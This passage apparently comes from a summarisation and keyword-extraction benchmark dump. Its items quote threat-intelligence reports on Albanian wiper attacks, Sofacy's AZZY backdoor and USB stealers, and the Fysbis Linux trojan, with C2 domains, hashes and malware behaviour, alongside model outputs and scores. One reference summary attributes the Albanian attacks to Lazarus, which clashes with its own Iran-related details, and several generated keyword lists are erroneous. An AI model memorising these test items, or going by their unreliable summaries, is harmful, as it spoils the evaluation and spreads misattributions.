method in wave 2; used in multiple IOCTL_DISK_GET_LENGTH_INFOBased on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania. This targeting is consistent with the previous wave of cyberattacks affecting the Albanian government during the5/7July 2022 wave of cyberattacks. ConclusionsIn this publication, we discussed the changes made to the second wave of ransomware and wiper samples that targeted Albanian institutions to evade detection and inflict maximum damage.Aside from the changes made to evade detection in wave 2, we suspect that the threat actors needed an automated and speedy wiper execution. In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure. This is reminiscent of Shamoon operations in the Middle East.Finally, for defenders we can highlight two important elements from the intrusion and malware analysis presented here:Monitor for remote software activities such as AnyDesk for unauthorized use Always hunt and monitor for expired and/or leaked signing certificates as they can be used by threat actors to load and execute malwareThreat detectionThe detection logic has been improved in all our solutions to ensure that our customers remain protected. We continue to investigate this threat using our Threat Intelligence and we will add additional detection logic once they are available.Our products protect against this threat and detect it with the following names:HEUR:Trojan-Ransom.Win32.Agent.gen Trojan-Ransom.Win32.Gen.aghh Trojan-Ransom.Win64.Agent.dpf Trojan.Win32.Agentb.kzkjIndicators of compromise cl.exe (wave 1)DriverC7BE7E90F63DADA6CD541FA84880874B$windir\\$system32\\drivers\\disksdump.sys (originally known as diskdump.sys)Signing certificates serial numbers6/714 78 1B C8 62 E8 DC 50 3A 55 93 46 F5 DC C5 18 01 FD D0 93 F6 50 87 F4 E9 AE 11 ED 65 0D 83 ", "generated_text": "Albanian entities; TIMS; ADAM; MEMEX; the second wave; ZEROCLEARE; two groups; certificates; Kuwait Telecommunications Company; initial entry point; The ransomware; wiper malware; a raw disk driver; direct hard disk access; metadata; the second wave; the malware; use; a custom disk driver; the first wave; capabilities; the second wave; software; AnyDesk; the malware; the initial entry point; the attackers; the initial entry point; the signature; the ZEROCLEARE variant; the second wave; the initial entry point; the first wave; the first wave; the wiper; the second wave; info; the victims; the second wave; the same group; the malware; Arabic; links; Shamoon; the Middle East; the vulnerabilities; some compromise; data; the vulnerability; the first wave; the threat actor.", "ref_text": "<START-1>The cybercriminal group Lazarus has been conducting cyberattacks against Albanian government entities in two waves, using ransomware and data-wiping malware signed with stolen certificates. The first wave occurred in July 2022, impacting Albanian e-services. The second wave started in September, targeting critical law enforcement systems with similar malware but modified for detection evasion. Wave 2 ransomware samples share similarities with wave 1, including the use of CreateFile and WriteFile APIs for file overwrites and RC4 encryption algorithm. The ransomware in both waves is based on ROADSWEEP, uses stolen certificates to appear legitimate, and encrypts files in an unrecoverable way, rendering a ransom demand ineffective. The wiper malware embeds a raw disk driver for direct access to wipe data quickly. In the second wave, the attackers used a leaked Nvidia code signing certificate to sign the wiper and embedded the disk driver within the malware for automated execution post-installation. They also modified messaging and encryption keys to evade security controls. Underground posts suggest the attackers may have used AnyDesk for initial access. Different attack groups speaking Persian and another language appear to be cooperating in the campaign. The malware contains political messaging reflecting tensions between Albania and Iran. The targeting of law enforcement and modifications for speed align with prior devastating Shamoon wiper attacks in the Middle East. Defenders are advised to monitor for suspicious certificates and remote access software to detect potential intrusions. The publication provides indicators of compromise and detection details for the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.29411764705882354, "t5/word/hint_hit_recall": 0.11836734693877551, "gpt3/lexical/rouge_rouge1": 0.4517906336088154, "gpt3/lexical/rouge_rouge2": 0.18836565096952906, "gpt3/lexical/rouge_rougeL": 0.24242424242424243, "gpt3/lexical/rouge_rougeLsum": 0.24242424242424243, "gpt3_generated_text": ["The article discusses a cyberattack targeting Albanian entities, specifically TIMS, ADAM, and MEMEX systems, in two waves using ransomware and wiper malware. The attackers used stolen certificates from Nvidia and Kuwait Telecommunications Company to sign the malware, possibly involving two different groups. The initial entry point may have been through the use of AnyDesk, a remote access utility. The malware in the second wave had modifications such as a custom disk driver for direct hard disk access and changes in metadata. The capabilities of the malware were enhanced for faster wiping activities, similar to the Shamoon wiper attacks in the Middle East. The article also highlights potential cooperation between different attack groups speaking different languages."]}, {"split_name": "val", "sample_id": "val_52", "prompt_text": "Extract the keywords: \u25bc47111FacebookGoogleTwitterSofacy (also known as \u201cFancy Bear\u201d, \u201cSednit\u201d, \u201cSTRONTIUM\u201d and \u201cAPT28\u201d) is an advanced threat group that has been active since around 2008, targeting mostly military and government entities worldwide, with a focus on NATO countries. More recently, we have also seen an increase in activity targeting Ukraine.Back in 2011-2012, the group used a relatively tiny implant (known as \u201cSofacy\u201d or SOURFACE) as its first stage malware. The implant shared certain similarities with the old Miniduke implants. This led us to believe the two groups were connected, at least to begin with, although it appears they parted ways in 2014, with the original Miniduke group switching to the CosmicDuke implant.At some point during 2013, the Sofacy group expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across four to five generations) and a few others. We\u2019ve seen quite a few versions of these implants and they were relatively widespread for a time.#Sofacy group has been active since 2008, targeting mostly military and government entities in NATO countriesTweetEarlier this year, we noticed a new release of the AZZY implant which, at the time, was largely undetected by anti-malware products. We observed several waves of attacks using this version, most recently in October. The new waves of attacks also included a new generation of USB stealers deployed by the Sofacy actor, with the first versions dating back to February 2015, and which appear to be geared exclusively towards high profile targets.In the months leading up to August, the Sofacy group launched several waves of attacks relying on zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player and Windows itself. For instance, its JHUHUGIT implant was delivered through a Flash zero-day and used a Windows EoP exploit to break out of the sandbox. The JHUHUGIT implant became a relatively popular first stage for the Sofacy attacks and was used again with a Java zero-day (CVE-2015-2590) in July 2015.While the JHUHUGIT (and more recently, \u201cJKEYSKW\u201d) implant used in most of the Sofacy attacks, high profile victims are being targeted with another first level implant, representing the latest evolution of their AZZYTrojan.Two recurring characteristics of the #Sofacy group are speed and the use of multi-backdoor packagesTweetThe first versions of the new AZZY implant appeared in August of this year. During a high profile incident we investigated, our products successfully detected and blocked a \u201cstandard\u201d Sofacy \u201cAZZY\u201d sample that was used to target a range of defense contractors. The sample used in this attack (md5 A96F4B8AC7AA9DBF4624424B7602D4F7, compiled July 29th, 2015) was a pretty standard Sofacy x64 AZZY implant, which has the internal name \u201cadvshellstore.dll\u201d.Interestingly, the fact that the attack was blocked didn\u2019t appear to stop the Sofacy team. Just an hour and a half later they had compiled and delivered another AZZY x64 backdoor (md5: 9D2F9E19DB8C20DC0D20D50869C7A373, compiled August 4th, 2015). This was no longer detectable with static signatures by our product. However, it was detected dynamically by the host intrusion prevention subsystem when it appeared in the system and was executed.This recurring, blindingly-fast Sofacy attack attracted our attention as neither sample was delivered through a zero-day vulnerability \u2014 instead, they appeared to be downloaded and installed by another malware. This separate malware was installed by an unknown attack as \u201cAppData\\Local\\Microsoft\\Windows\\msdeltemp.dll\u201d (md5: CE8B99DF8642C065B6AF43FDE1F786A3).The top level malware, CE8B99DF8642C065B6AF43FDE1F786A3 (named by its authors \u201cmsdeltemp.dll\u201d according to internal strings, and compiled July 28th, 2015) is a rare type of the Sofacy AZZY implant. It has been modified to drop a separate C&C helper, (md5: 8C4D896957C36EC4ABEB07B2802268B9) as \u201ctf394kv.dll\u201c.The dropped \u201ctf394kv.dll\u201d file is an external C&C communications library, compiled on July 24th, 2015 and used by the main backdoor for all Internet-based communications.Decrypted configuration block of the C&C helper library \u201ctf394kv.dll\u201cThis code modification marks an unusual departure from the typical AZZY backdoors, with its C&C communication functions moved to an external DLL file. In the past, the Sofacy developers modified earlier AZZY backdoors to use a C&C server encoded in the registry, instead of storing it in the malware itself, so this code modularisation follows the same line of thinking.In addition to the new AZZY backdoors with side-DLL for C&C, we observed a new set of data-theft modules deployed against victims by the Sofacy group. Among the most popular modern defense mechanisms against APTs are air-gaps \u2014 isolated network segments without Internet access, where sensitive data is stored. In the past, we\u2019ve seen groups such as Equation and Flame use malware to steal data from air-gapped networks. The Sofacy group uses such tools as well.The first versions of these new USB stealer modules appeared around February 2015 and the latest appear to have been compiled in May 2015. Older versions of these USBSTEALER modules were which is named internally as msdetltemp.dll.This data theft module appears to have been compiled in May 2015 and is designed to watch removable drives and collect files from them, depending on a set of rules defined by the attackers. The stolen data is copied into a hidden directory as \u201c%MYPICTURES%\\%volume serial number%\u201c, from where it can be exfiltrated by the attackers using one of the AZZY implants. More details on the new USB stealers are available in the section on technical analysis.Over the last year, the Sofacy group has increased its activity almost tenfold when compared to previous years, becoming one of the most prolific, agile and dynamic threat actors in the arena. This activity spiked in July 2015, when the group dropped two completely new exploits, an Office and Javazero-day.At the beginning of August, Sofacy began a new wave of attacks, focusing on defense-related targets. As of November 2015, this wave of attacks is ongoing. The attackers deploy a rare modification of the AZZY backdoor, which is used for the initial reconnaissance. Once a foothold is established, they try to upload more backdoors, USB stealers as well as other hacking tools such as \u201cMimikatz\u201d for lateral movement.Over the last year, the #Sofacy group has increased its activity almost tenfold, that spiked in July 2015TweetTwo recurring characteristics of the Sofacy group that we keep seeing in its attacks are speed and the use of multi-backdoor packages for extreme resilience. In the past, the group used droppers that installed both the SPLM and AZZY backdoors on the same machine. If one of them was detected, the other one provided the attacker with continued access.As usual, the best defense against targeted attacks is a multi-layered approach. Combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and default-deny strategies. According to a study by the Australian DSD, 85% of the targeted attacks analysed could have been stopped by four simple defense strategies. While it\u2019s impossible to achieve 100% protection, in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker \u2013 who will just give up and move on to other targets.More information about the Sofacy group is available to customers of Kaspersky Intelligent Services.Is there a \u2018silver bullet\u2019 to protect yourself against Sofacy? Learn more on Kaspersky Business blog.Internal name: DWN_DLL_MAIN.dll File format: PE32 DLL Linker version: 11.0, Microsoft Visual Studio Linker timestamp: 2015.07.28 13:05:20 (GMT) Exported functions:10003F30: ?Applicate@@YGHXZ 10004270: ?SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z 10003F60: ?k@@YGPAUHINSTANCE__@@PBD@ZThe library starts its main worker thread from the DllMain function.Most of the strings inside the module are encrypted with a homebrew XOR-based algorithm. In addition to that, API function names are reversed, presumably to avoid detection in memory.Once started, the code in the main thread resolves the basic API functions it needs and loads an additional library from the following location: \u201c%TEMP%\\tf394kv.dll\u201d. If this file is not present, it is recreated from a hardcoded encrypted array inside the body of the DLL.Next, the module enters an infinite loop. Every five minutes it collects basic system information and sends it to the C2 server:Windows version number Hardcoded string \u201c4.3\u201d (the backdoor\u2019s internal version number) List of running processesThe main thread also spawns a separate thread for receiving new commands from the C2 servers. Every 10 minutes, it sends a new request to the server. The server is expected to send back executable code and one of the following commands:Write a new file \u201c%LOCAL_APPDATA%\\dllhost.exe\u201d or \u201c%TEMP%\\dllhost.exe\u201d and execute it, then delete the file Write a new file \u201c%LOCAL_APPDATA%\\sechost.dll\u201d or \u201c%TEMP%\\sechost.dll\u201d and call its first exported function using \u201crundll32.exe\u201d or Windows API, then delete the file Run shellcode provided by the server in a new threadWhile processing the commands, the backdoor logs all errors and execution results. The module also reads the contents of the file \u201c%APPDATA%\\chkdbg.log\u201d and appends it to the results. It then sends the aggregated log back to the C2 server.The module aborts the thread receiving C2 command after it fails to correctly execute commands more than six times in a row, i.e. if file or process creation fails.The export called \u201ck\u201d is a wrapper for the \u201cLoadLibraryA\u201d API function.The export called \u201cSendDataToServer_2\u201d does exactly what the name means: it encrypts all collected data, encodes it using Base64 encoding and calls its additional library to send the data to the C2 server. The names of the C2 servers are hardcoded.Hardcoded C&C servers in the main moduleThe two C&C\u2019s hardcoded in the configuration block of the main binary are:intelnetservice[.]com intelsupport[.]netThe export called \u201cApplicate\u201d runs a standard Windows application message loop until a \u201cWM_ENDSESSION\u201d message is received. It then terminates the main thread.Internal name: snd.dll File format: PE32 DLL Linker version: 11.0, Microsoft Visual Studio Linker timestamp: 2015.07.24 12:07:27 (GMT) Exported functions:10001580: Init 10001620: InternetExchange 10001650: SendDataThis external library implements a simple Wininet-based transport for the main module.The strings inside the binary are encrypted using 3DES and XOR and reversed.The DllMain function initializes the library and resolves all required Windows API functions.The \u201cInit\u201d export establishes connection to port 80 of a C2 server using Wininet API. The user agent string employed is \u201cMSIE 8.0\u201d.The \u201cSendData\u201d export sends a HTTP POST request using a hardcoded URI \u201c /store/\u201c. The reply, if its length is not equal to six and its contents do not contain \u201cOK\u201d is returned back to the caller.The \u201cInternetExchange\u201d export closes the established connection and frees associated handles.File format: PE32 EXE File size: 142,336 bytes Linker version: 11.0, Microsoft Visual Studio Linker timestamp: 2015.02.10 10:01:59 (GMT)Most of the strings and data in the file are encrypted using 3DES and XOR.The code makes use of the Windows Crypto API for 3DES and the decryption key is stored as a standard Windows PUBLICKEYSTRUC structure:Part of the decryption algorithmHeader of one encrypted data buffer containing the hardcoded 3DES keyFirst, it creates a new directory: \u201c%LOCAL_APPDATA%\\Microsoft\\Windows\u201d. If the directory creation fails it tries to install into \u201c%TEMP%\u201d directory instead.Next it writes a hardcoded binary from its body to \u201cmsdeltemp.dll\u201d into the target directory. If the file exists it then moves it to \u201c__tmpdt.tmp\u201d in the same directory and continues the installation. Sets file File format: PE32 DLL File size: 73 728 bytes Linker version: 11.0, Microsoft Visual Studio Linker timestamp: 2015.02.10 07:20:02 (GMT) Exported functions: 10002B55: ApplicateMost of the strings inside the binary are encrypted using a homebrew XOR-based algorithm and reversed.The library is an older version of the \u201cDWN_DLL_MAIN.dll\u201d (md5: one in the newer library. This version of the module does not rely on an external transport DLL for communicating with its C2 servers; instead it directly uses Wininet API functions.The module contains the following hardcoded C2 server names:drivres-update[.]info softupdates[.]infoThe module uses a hardcoded URL (\u201c/check/\u201c) for sending HTTP POST requests to its C2 servers.The server is expected to send back executable code and one of the following commands:Write a new file \u201c%LOCAL_APPDATA%\\svchost.exe\u201d or \u201c%TEMP%\\svchost.exe\u201d and execute it,then delete the file Write a new file \u201c%LOCAL_APPDATA%\\conhost.dll\u201d or \u201c%TEMP%\\conhost.dll\u201d and call its first exported function using \u201crundll32.exe\u201d or Windows API, then delete the file Run shellcode provided by the server in a new threadInternal name: msdetltemp.dll (from resources) File size: 50,176 bytes File format: PE32 EXE Linker version: 10.0, Microsoft Visual Studio Linker timestamp: 2015.02.09 11:48:01 (GMT)Most of the strings inside the binary are encrypted using 3DES and XOR and reversed.The program creates the mutex \u201cmtx\u201d and an event named \u201cWerTyQ34C\u201d.Upon start, it creates a window with the class name \u201cHello\u201d and title \u201cProgram\u201d, subscribes for device arrival notifications for that window and enters a standard Windows message processing loop. The message processing function waits for the WM_DEVICECHANGE event and starts a new thread on its arrival.The module inspects every new disk volume attached to the system. For every disk it creates a \u201cstash\u201d directory in \u201c%root stash directory location%\\%volume serial number in hex%\u201d with attributes FILE_ATTRIBUTE_HIDDEN and FILE_ATTRIBUTE_SYSTEM. The root stash directory location may be read from the configuration file or set to the default location which is \u201c%MYPICTURES%\u201d.Then, it traverses the filesystem of the volume looking for files. Depending on the settings read from the configuration file, the scope may be narrowed to files with particular extensions and/or files created after a specified date.It is worth noting that if the source file location contains the string \u201cSystem Volume Information\\S-1-5- 21-1315235578-283289242\\\u201d, then the file is deleted after copying to the \u201cstash\u201d directory. There are known related samples that are able to create such directories on removable drives, i.e. the sample \u201cNvCpld.dat\u201c. It is a text file that may contain the following configuration parameters:Path \u2013 location of the root \u201cstash\u201d directory Ext \u2013 search for files with one of these extensions only Date \u2013 search for files not earlier than this dateInternal name: NvCpld.dll (from export table), msdetltemp.dll (from resources), IGFSRVC.dll (from resources)File format: PE32 DLL File size: 76,288 bytes Linker version: 11.0, Microsoft Visual Studio Linker timestamps: 2015.05.29 11:20:32 (GMT), 2006.11.25 04:39:15 (GMT) 10002A80: NvStopThis library is a newer version of the file collection module (md5: information in the resource section.The DllMain function only decrypts the data structures and initializes Windows API pointers.The function \u201cNvMswt\u201d is a wrapper for the API function MsgWaitForMultipleObjects.The function \u201cNvReg\u201d is a wrapper for the API function RegisterClassW.The function \u201cNvStart\u201d is similar to the main function of the older module; it creates a window and enters the message loop waiting for device arrival notifications. The only difference introduced is that an event named \u201cWerTyQ34C\u201d can be signalled by the function \u201c NvStop\u201d to terminate the message loop softupdates[.]infoTrojan.Win32.Sofacy.al Trojan.Win32.Sofacy.be Trojan.Win32.Sofacy.bf Trojan.Win32.Sofacy.bg Trojan.Win32.Sofacy.bi Trojan.Win32.Sofacy.bj Trojan.Win64.Sofacy.q Trojan.Win64.Sofacy.s HEUR:Trojan.Win32.GenericYour email address will not be published. Required fields are marked *Name *Email *WebsiteEnter your comment hereSelect all images with street signs.reCAPTCHAWhy this CAPTCHA?VerifyNotify me of follow-up comments by email.Notify me of new posts by email.Kaspersky Security Bulletin 2015. Top security storiesRussian financial cybercrime: how it worksKaspersky Security Bulletin. 2016 PredictionsIT threat evolution in Q3 2015I am HDRoot! Part 2The rise of .NET and Powershell malwareAPT Research Discourse at Virus Bulletin 2015Gaza cybergang, where\u2019s your IR team?Satellite Turla: APT Command and Control in the SkyNew activity of the Blue Termite APT\u00a9 2015 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respectiveowners.Contact us | Read our privacy policyEvents ", "generated_text": "the Sofacy group; Fancy Bear; Sednit; STRONTIUM; APT28; 2008; NATO; Ukraine; a new release; AZZY; NETUI; CVE-2015-2590; a Flash zero-day; CVE-2015-2590; CVE-2015-2590; USB stealers; Three; versions; a Java zero-day; a JHUHUGIT implant; USB stealers; CORESHELL; SPLM; CHOPSTICK; JHUHUGIT; CORESHELL; CORESHELL; CHOPSTICK; JKEYSKW; these implants; the group; a new generation; USB stealers; a new generation; an improved version; 11; 2018; new waves; the latest evolution; tools.", "ref_text": "<START-1>The report profiles the activities and tools of the advanced persistent threat (APT) group Sofacy, also known as APT28, Fancy Bear, Sednit, and STRONTIUM. Sofacy has targeted military and government entities since around 2008, with a focus on NATO countries. Sofacy has continuously expanded its arsenal of custom malware like CORESHELL, SPLM, JHUHUGIT, and AZZY. In 2015, the group was observed using zero-day exploits and a modified version of AZZY for widespread attacks on defense contractors. The attacks involve multi-stage malware with resilience via multiple backdoors on compromised systems. Every 10 minutes, the backdoor sends a new request to the server, which is expected to send back executable code and one of the following commands: a. Write a new file \u201c%LOCAL_APPDATA%\\dllhost.exe\u201d or \u201c%TEMP%\\dllhost.exe\u201d and execute it, then delete the file b. Write a new file \u201c%LOCAL_APPDATA%sechost.dll\u201d or \u201c%TEMP%\\sechost.dll\u201d and call its first exported function using \u201crundll32.exe\u201d or Windows API, then delete the file c. Run shellcode provided by the server in a new thread While processing the commands, the backdoor logs all errors and execution results. It also reads the contents of the file \u201c%APPDATA%\\chkdbg.log\u201d and appends it to the results before sending them to the C2 server. The module aborts the thread receiving C2 command after it fails to correctly execute commands more than six times in a row, i.e. if file or process creation fails. Sofacy has also developed USB data theft tools to exfiltrate data from air-gapped networks. Infrastructure analysis has revealed Sofacy's preferred hosting providers, command and control servers, and use of encryption and code obfuscation to avoid detections. The group frequently recompiles versions of its malware to bypass antivirus signatures. Sofacy is noted for its speed of attacks and innovation in malware and infrastructure. The report highlights the need for a multi-layered defense including traditional antivirus, patching, whitelisting, and monitoring to guard against the group's tactics. Overall, the report profiles Sofacy's capabilities, tools, infrastructure, and targeting, warning that the highly active group continues to enhance its arsenal despite takedowns of previous versions. Constant vigilance and an adaptive defense posture are required against the adaptable threat. <END-1>", "t5/keyword/hint_hit_precision": 0.325, "t5/word/hint_hit_recall": 0.04285714285714286, "gpt3/lexical/rouge_rouge1": 0.3445544554455446, "gpt3/lexical/rouge_rouge2": 0.10735586481113321, "gpt3/lexical/rouge_rougeL": 0.19009900990099013, "gpt3/lexical/rouge_rougeLsum": 0.19009900990099013, "gpt3_generated_text": ["The Sofacy group, also known as Fancy Bear, Sednit, STRONTIUM, and APT28, has been active since 2008, targeting military and government entities in NATO countries, with a recent increase in activity in Ukraine. The group has evolved over the years, adding new backdoors and tools such as CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT, and AZZY. They have been using zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player, and Windows to launch attacks, with a focus on high-profile targets. The group's latest release of the AZZY implant has been largely undetected by anti-malware products, and they have been deploying new generations of USB stealers. The Sofacy group is known for its speed and use of multi-backdoor packages, with a constant evolution in their tactics and tools."]}, {"split_name": "val", "sample_id": "val_53", "prompt_text": "Extract the keywords: 24POSTED BY: Bryan Lee and Rob Downs on February 12, 2016 3:00 PMFILED IN: Malware, Threat Prevention, Unit 42 TAGGED: Fysbis, Linux, SofacyThe Sofacy group, also known as APT28 and Sednit, is a fairly well known cyber espionage group believed to have ties to Russia. Their targets have spanned all across the world, with a focus on government, defense organizations and various Eastern European governments. There have been numerous reports on their activities, to the extent that a Wikipedia entry has even been created for them.Get Updates Sign up to receive the latest news, cyber threat intelligence and research from Unit 42.From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems \u2013 Windows, OSX, Linux, even mobile iOS.Business EmailSubmitThe Linux malware Fysbis is a preferred tool of Sofacy, and though it is not particularly sophisticated, Linux security in general is still a maturing area, especially in regards to malware. In short, it is entirely plausible that this tool has contributed to the success of associated attacks by this group. This blog post focuses specifically on this Linux tool preferred by Sofacy and describes considerations and implications when it comes to Linux malware.Fysbis is a modular Linux trojan / backdoor that implements plug-in and controller modules as distinct classes. For reference, some vendors categorize this malware under the Sednit attacker group naming designation. This malware includes both 32-bit and 64-bit versions of Executable and Linking Format (ELF) binaries. Additionally, Fysbis can install itself to a victim system with or without root privileges. This increases the options available to an adversary when it comes to selecting accounts for installation.Summary information for the three binaries we analyzed follows:MD5 Install as root Root install desc Install as non-root Non-root install Install as root Root install desc 3072:n+1R4tREtGN4qyGCXdHPYK9l0H786 O26BmMAwyWMn/qwwiHNl:n+1R43QcIL XdF0w6IBmMAwwCwwi 141.2 KB (144560 bytes) ELF 64-bit (stripped) /bin/rsyncd synchronize and backup service ~/.config/dbus-notifier/dbus-inotifier system service d-bus notifierazureon-line[.]com (TCP/80) 9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z 175.9 KB (180148 bytes) ELF 32-bit (stripped) /bin/ksysdefd system kernel service defender ~/.config/ksysdef/ksysdefdSelect a CategorySelect a MonthMORE \u2192Palo Alto Networks News of the Week \u2013 February 13 posted by Anna Lough on February 13, 2016 A Look Into Fysbis: Sofacy\u2019s Linux Backdoor posted by Bryan Lee on February 12, 2016 The Cybersecurity Canon: Dragnet Nation posted by Palo Alto Networks on February 12, 2016 Channel Scoop \u2013 February 12, 2016 posted by Lang Tibbils on February 12, 2016 The Cybersecurity Canon: Cyberdeterrence and Cyberwar posted by Palo Alto Networks on February 11, 2016MORE \u2192Non-root install Usage Timeframesystem kernel service defender198.105.125[.]74 (TCP/80) Early 2015Table 2: Sample 2 \u2013 Early 2015 Sofacy 32-bit FysbisMD5 Install as root Root install desc Install as non-root Non-root install 6144:W/D5tpLWtr91gmaVy+mdckn6BCUd c4mLc2B9:4D5Lqgkcj+ 314.4 KB (321902 bytes) ELF 64-bit (not stripped) /bin/ksysdefd system kernel service defender ~/.config/ksysdef/ksysdefd system kernel service defendermozilla-plugins[.]com (TCP/80) Late 2015Table 3: Sample 3 \u2013 Late 2015 Sofacy 64-bit FysbisOverall, these binaries are assessed as low sophistication, but effective. They epitomize the grudging reality that Advanced Persistent Threat (APT) actors often don\u2019t require advanced means to affect their objectives. Rather, these actors more often than not hold their advanced malware and zero day exploits in reserve and employ just enough resources to meet their goals. It is only fair that defenders use any shortcuts or tricks at their disposal to shorten the amount of time it takes to assess threats. In other words, defenders should always look for ways to work smarter before they have to work harder.Binary strings alone revealed a good amount about these files, increasing the efficacy of activities such as static analysis categorization (e.g., Yara). One example of this is Fysbis installation and platform targeting information for the samples in Table 1 and Table 2.Figure 1: Sofacy Fysbis installation and platform targeting found in stringsIn this case, we can see the binary installation path and local reconnaissance to determine which flavor of Linux the malware is running. This is followed by a number of Linux shell command style commands related to the malware establishing persistence.Another example of easily obtained information from these samples is capability based.Figure 2: Sofacy Fysbis capability related leakage through stringsFigure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities. In addition to contributing to static analysis detections, this can be useful as a starting point for further incident response prioritization and qualification of the threat.Interestingly, the most recent ELF 64-bit binary we analyzed (Table 3) was not stripped prior to delivery, which offered additional context in the form of symbolic information. Defenders more familiar with Windows Portable Executable (PE) binaries can equate this with compilation of a Debug version versus a Release version. For comparison, if we were to inspect Fysbis \u201cRemoteShell\u201d associated strings in one of the stripped variants, we would only see the following:Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capabilityCompare this with what is available from the non-stripped variant:Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capabilityLittle static analysis gifts like these can help to speed defender enumeration of capabilities and \u2013 more importantly \u2013 further contribute to correlation and detection across related samples.Additionally, this latest sample demonstrated minor evolution of the threat, most notably in terms of obfuscation. Specifically, both samples in Table 1 and Table 2 leaked installation information in the clear within binary strings. This was not the case with the sample in Table 3. Taking a closer look at this non-stripped binary using a disassembler, the following corresponds to decoding malware installation information for a root-privilege account.Figure 5: Assembly code view of Sample 3 installation decodingIn this case, the symbolic information hints at the method used for decoding, with references to mask, path, name, and info byte arrays.Figure 6: Assembly view of Sample 3 root installation related byte arraysAs it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account. Corresponding INSTALLUSER byte arrays exist, which facilitate the non- root installation for the trojan. The same masking method is also used by the binary to decode malware configuration C2 information, further showcasing how a little symbolic information can go a long way towards completeness and higher confidence in assessment of a malware sample.If you would like to learn more about how Fysbis works, the samples analyzed remain fairly consistent with the sample analysis found here.As Unit 42 has discussed in depth in other blog articles, we have observed that adversaries in general are seemingly hesitant in changing their infrastructure. This may be due to not wanting to commit additional resources, or simply a matter of retaining familiarity for the sake of timeliness. In either case, we see the same type of behavior here with the Fysbis samples in use by Sofacy.The oldest sample (Table 1), was found to beacon to the domain azureon-line[.]com, which had already been widely publicized as a known command and control domain for the Sofacy group. Using passive DNS, we can see that two of the original IPs this domain resolved to, 193.169.244[.]190 and 111.90.148[.]148 also mapped to a number of other domains that had been in use by the Sofacy group during that time period.Figure 7: Sample 1 C2 resolutionsThe first of the newer samples (Table 2), continues the trend and beacons to an IP also widely associated with the Sofacy group, 198.105.125[.]74. This IP has been mostly associated with the tool specifically known as CHOPSTICK, which can be read about here.Figure 8: Sample 2 C2 resolutionsThe newest sample (Table 3), introduces a previously unknown command and control beacon to mozilla-plugins[.]com. This activity aligns with the previously observed Sofacy group tactic of integrating legitimate company references into their infrastructure naming convention. Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign. Comparing this sample\u2019s binary with the other two however, shows there are significant similarities on the code level as well as in terms of shared behavior.Figure 9: Sample 3 C2 resolutionsLinux is used across business and home environments and appears in a variety of form factors. It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers. Linux is also at the foundation of Android devices and a number of other embedded systems. The value proposition of Linux \u2013 especially when it comes to its use in the enterprise \u2013 can be broken out into three perceived benefits: lower total cost of ownership (TCO), security, and feature set. While numbers and comparison alone can contribute to measurement of TCO and feature set, security requires further qualification. Expertise in the Linux platform is highly sought after across all industries for multiple disciplines, from system administration to big data analytics to incident response.The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.). This means, from a practical perspective, most of a business\u2019s focus remains on supporting and protecting Windows assets. Linux remains a mystery to a number of enterprise IT specialists \u2013most critically for network defenders. Identifying and qualifying potential incidents requires a familiarity with what constitutes normal operation in order to isolate anomalies. The same is true for any other asset in an environment, normal operation is entirely dependent on a given asset\u2019s role / function in the enterprise.Lack of expertise and visibility into non-Windows platforms combine in some environments to present significant risks against an organization\u2019s security posture. As a recent caution, the Linux vulnerability described under CVE-2016-0728 further demonstrates the potential breadth of real-world risks to associated platforms. A natural extension of this exposure is increased targeting by both dedicated and opportunistic attackers across various malicious actor motivations. Despite the lingering belief (and false sense of security) that Linux inherently yields higher degrees of protection from malicious actors, Linux malware and vulnerabilities do exist and are in use by advanced adversaries. To mitigate associated risks requires tailored integration of the people, processes, and technology in support of prevention, monitoring, and detection within an environment.Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:IPS signature 14917 deployed to identify and prevent command and control activityThe C2 domains and files mentioned in this report are blocked in our Threat Prevention 3072:n+1R4tREtGN4qyGCXdHPYK9l 0H786O26BmMAwyWMn/qwwiHNl:n 6144:W/D5tpLWtr91gmaVy+mdckn6 synchronize and backup service ~/.config/dbus-notifier/dbus-inotifier system service d-bus notifier /bin/ksysdefd ~/.config/ksysdef/ksysdefd system kernel service defender azureon-line[.]com 198.105.125[.]74mozilla-plugins[.]com Mozillaplagins[.]comC2 C2Name *Email *WebsitePost CommentPrivacy Policy Legal Notices Site Index SubscriptionsCopyright \u00a9 2007-2013 Palo Alto Networks ", "generated_text": "APT28; Sednit; Fysbis; Linux; the group; government; defense organizations; Eastern European governments; tools; zero-day exploits; spear-phishing attacks; legitimate websites; watering hole attacks; targets; Windows; OSX; Linux; Windows Mobile; mobile iOS; port; a modular Linux trojan; plug-in; controller modules; Plug-in and controller modules; modules; Plug-in; control modules; commands; command execution; MAC; the command; control; privileges; a victim; an adversary; the capabilities; access; files; network; features.", "ref_text": "<START-1>The PDF discusses the Linux malware Fysbis, which is used by the cyberespionage group Sofacy (also known as APT28 and Sednit). Fysbis is a modular trojan/backdoor for Linux 